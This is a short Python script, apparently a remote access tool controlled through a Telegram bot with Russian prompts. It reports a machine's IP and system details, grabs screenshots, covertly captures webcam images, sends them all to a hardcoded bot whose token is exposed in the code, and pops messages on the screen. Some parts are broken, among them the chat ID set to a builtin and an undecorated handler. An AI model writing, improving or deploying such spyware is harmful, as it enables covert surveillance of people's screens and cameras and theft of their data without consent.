import telebot
from telebot import types
import requests
import cv2
import pyautogui as pag
import platform as pf
TOKEN = '5440300475:AAGF1GR2RvrTRex6AMj9EufhpgR06m9uHZc'
CHAT_ID = id
client = telebot.TeleBot(TOKEN)
requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text=Online")
@client.message_handler(commands=['start'])
def start(message):
    rmk = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btns = ["/ip","/spec","/screenshot","/webcam","/message","/input"]
    for btn in btns:
        rmk.add(types.KeyboardButton(btn))
    client.send_message(message.chat.id, "Выберите действие", reply_markup=rmk)

@client.message_handler(commands=['ip'])
def ip_adress(message):
    response = requests.get("http://jsonip.com/").json()
    client.send_message(message.chat.id, f"IP Adress: {response['ip']}")
client.message_handler(commands=['spec'])
def spec(message):
    msg = f"Name PC: {pf.node()}\n Processor: {pf.processor()}\nSystem: {pf.system()} {pf.release()}"
    client.send_message(message.chat.id, msg)
@client.message_handler(commands=['screenshot'])
def screenshot(message):
    pag.screenshot('000.jpg')
    with open('000.jpg', 'rb') as img:
        client.send_photo(message.chat.id, img)
@client.message_handler(commands=['webcam'])
def webcam(message):
    cap = cv2.VideoCapture(0)
    for i in range(30):
        cap.read()
    ret, frame = cap.read()
    cv2.imwrite('cam.jpg', frame)
    cap.release()
    with open('cam.jpg', 'rb') as img:
        client.send_photo(message.chat.id, img)
@client.message_handler(commands=['message'])
def message_sending(message):
    msg = client.send_message(message.chat.id, "Введите ваше сообщение, которое желаете вывести на экран:")
    client.register_next_step_handler(msg, next_message_sending)
def next_message_sending(message):
    try:
        pag.alert(message.text, "`")
    except Exception:
        client.send_message(message.chat.id, 'Что-то пошло не так...')
@client.message_handler(commands=['input'])
def message_sending_with_input(message):
    msg = client.send_message(message.chat.id, 'Введите ваше сообщение')
    client.register_next_step_handler(msg, next_message_sending_with_input)
def next_message_sending_with_input(message):
    try:
        answer = pag.prompt(message, '~')
        client.send_message(message.chat.id, answer)
    except Exception:
        client.send_message(message.chat.id, 'Что-то пошло не так...')
client.polling()
